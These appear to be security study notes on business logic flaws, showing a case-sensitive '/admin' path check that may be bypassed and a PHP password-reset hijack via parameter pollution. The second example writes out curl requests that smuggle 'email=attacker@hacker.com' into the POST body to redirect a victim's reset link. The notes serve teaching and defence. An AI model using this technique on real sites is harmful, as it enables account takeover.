# Business Logic Flaws
 
## Definition
A typical logical path of an application is either bypassed, circumvented,
or manipulated by an attacker in a way the developer never intended.
 
## Example 1 — Case-sensitivity / exact-match logic bug
```js
if (url.substr(0,6) === '/admin') {
  // ...
} else {
  // ...
}
```
`===` looks for an *exact* match — so `/Admin` or `/ADMIN` may be treated
completely differently from `/admin`, potentially bypassing whatever
access-control check this condition was meant to enforce.
 
## Example 2 — Password reset hijack via parameter pollution
```bash
curl "http://.../reset?email=robert%40company.com" \
  -H "..." \
  -d "username=robert"
```
- The user account here is retrieved through the query string.
- PHP's `$_REQUEST` superglobal by default **favors POST data over the
  query string** when both are present for the same key.
- This means you can add another parameter to the POST form body that
  controls *where* the password reset email actually gets sent:
 
```bash
curl "http://.../reset?email=robert%40company.com" \
  -H "..." \
  -d "username=robert&email=attacker@hacker.com"
```
 
- Since the POST-body `email` value takes precedence over the query
  string's `email` value in `$_REQUEST`, the password reset link can be
  redirected to an attacker-controlled inbox.
- From there: create a new account using `attacker@hacker.com`, and
  retrieve the reset link intended for the victim's account.
